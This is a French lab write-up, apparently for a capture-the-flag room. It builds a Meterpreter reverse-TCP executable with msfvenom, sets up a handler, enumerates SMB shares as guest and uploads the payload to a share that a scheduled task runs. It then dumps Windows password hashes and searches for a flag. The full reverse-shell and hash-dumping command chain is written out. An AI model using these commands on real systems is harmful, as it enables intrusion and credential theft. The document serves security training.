# 1. Génération du payload

Création d'un payload Meterpreter Windows 64 bits :

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
LHOST=10.130.118.220 \
LPORT=443 \
-f exe \
-o /tmp/payload.exe
```

## Explication

- `msfvenom` : outil Metasploit permettant de générer des payloads
- `-p` : sélection du payload
- `windows/x64` : cible Windows 64 bits
- `meterpreter_reverse_tcp` : Meterpreter stageless avec connexion reverse TCP
- `LHOST` : Local Host - IP de l'AttackBox
- `LPORT=443` : Local Port - port vers lequel la cible se connectera
- `-f exe` : génère un exécutable Windows
- `-o /tmp/payload.exe` : output dans le chemin

Le payload utilisé est **stageless**.

Contrairement à un payload staged tel que :

```text
meterpreter/reverse_tcp
```

le payload :

```text
meterpreter_reverse_tcp
```

ne nécessite pas de récupérer une seconde partie du payload après son exécution. Meterpreter est directement contenu dans le payload.



# 2. Configuration du handler

Lancement de Metasploit :

```bash
msfconsole
```

Chargement du handler :

```text
use exploit/multi/handler
```

Configuration :

```text
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.130.118.220
set LPORT 443
show options
run -j (pour run en arriere plan et libérer le terminal)

Vérification :
jobs
```

## Rôle du handler

Le handler attend la connexion provenant du payload :

```text
Windows cible
     |
     | reverse TCP
     v
Attack-box
     |
     v
multi/handler
     |
     v
Meterpreter
```



# 3. Énumération des partages SMB

Le scénario indique qu'un partage SMB est accessible en écriture par un utilisateur Guest.

Chargement du module :

```text
use auxiliary/scanner/smb/smb_enumshares
```

Configuration :

```text
set RHOSTS 10.130.145.139
set SMBUser guest
set SMBPass ""
show options
run
```

## Résultat

```text
ADMIN$    Remote Admin
C$        Default share
internal  Internal files
IPC$      Remote IPC
public    Public uploads
```

Le partage intéressant est :

```text
public car sa description est : Public uploads
```

Le chemin réseau correspondant est :

```text
\\10.130.145.139\public
```

SMB fonctionne ici sur :

```text
TCP/445
```

### Rappel SMB

SMB signifie :

```text
Server Message Block
```

Il est notamment utilisé sous Windows pour :

- le partage de fichiers
- le partage d'imprimantes
- certaines communications réseau Windows

Le port principal utilisé est :

```text
TCP/445
```



# 4. Upload du payload via SMB

Chargement du module :

```text
use auxiliary/admin/smb/upload_file
```

Configuration :

```text
set RHOSTS 10.130.145.139
set SMBUser guest
set SMBPass "" (mdp vide)
set SMBSHARE public
set LPATH /tmp/payload.exe (local path)
set RPATH payload.exe (Remote Path => Nom du fichier créer sur la cible)
show options
run
```
## Résultat

```text
[+] /tmp/payload.exe uploaded to payload.exe
```



# 5. Exécution automatique du payload

Le scénario indique qu'une tâche planifiée Windows surveille le partage.

Lorsqu'un fichier `.exe` y est déposé :

```text
payload.exe
    ↓
Scheduled Task
    ↓
exécution
    ↓
Meterpreter reverse TCP
    ↓
Attack-box
    ↓
multi/handler
```

Résultat :

```text
[*] Meterpreter session 1 opened
```



# 6. Comprendre la reverse connection

Dans une connexion classique :

```text
Attacker ---> Target
```

Dans une reverse connection :

```text
Target ---> Attacker
```

Ici :

```text
Windows
10.130.145.139
       |
       | connexion TCP sortante
       v
AttackBox
10.130.118.220:443
```

Le payload connaît donc :

```text
LHOST = 10.130.118.220
LPORT = 443
```

Lorsqu'il est exécuté, il tente de se connecter à cette adresse.

Le handler attend cette connexion.



# 7. Interaction avec Meterpreter

Lister les sessions :

```bash
sessions


Interagir avec la session 1 :

sessions -i 1
```

`-i` signifie ici :

```text
interact
```

Le prompt devient :

```text
meterpreter >
```

À partir de ce moment, les commandes Meterpreter sont exécutées sur la machine Windows compromise.



# 8. Reconnaissance post-exploitation

Commandes utilisées :

```text
sysinfo
getuid
pwd
```



# 9. Post-exploitation : dump des hashes Windows

La room demande explicitement d'utiliser un **module de post-exploitation**. Donc pas hashdump (commande intégré à Meterpreter)

On commence par placer Meterpreter en arrière-plan :

```text
background
```

La session reste ouverte mais on revient dans `msfconsole`.

Chargement du module :

```text
use post/windows/gather/smart_hashdump


Configuration :

set SESSION 1
show options
run
```



# 12. Recherche du flag

Retour dans Meterpreter :

```text
sessions -i 1
```

La room indique que le flag se trouve quelque part sous :

```text
C:\Users\Administrator
```

Recherche :

```text
search -d C:\\Users\\Administrator -f *flag*
```

## Explication

- `-d` : Définit le répertoire de recherche
- `-f` : Définit le pattern du nom recherché
- `**` : Wildcards - signifie n'importe quels caractères exemple : flag.txt / admin_flag.txt / finalflag.txt / my_flag_backup.txt


# Chaîne d'attaque complète

```text
Génération du payload
        ↓
msfvenom
        ↓
payload.exe
        ↓
Configuration du multi/handler
        ↓
Énumération SMB
        ↓
Découverte du partage public
        ↓
Upload SMB
        ↓
Scheduled Task
        ↓
Exécution du payload
        ↓
Reverse TCP
        ↓
Meterpreter
        ↓
NT AUTHORITY\SYSTEM
        ↓
Post-exploitation
        ↓
smart_hashdump
        ↓
Recherche du flag
```
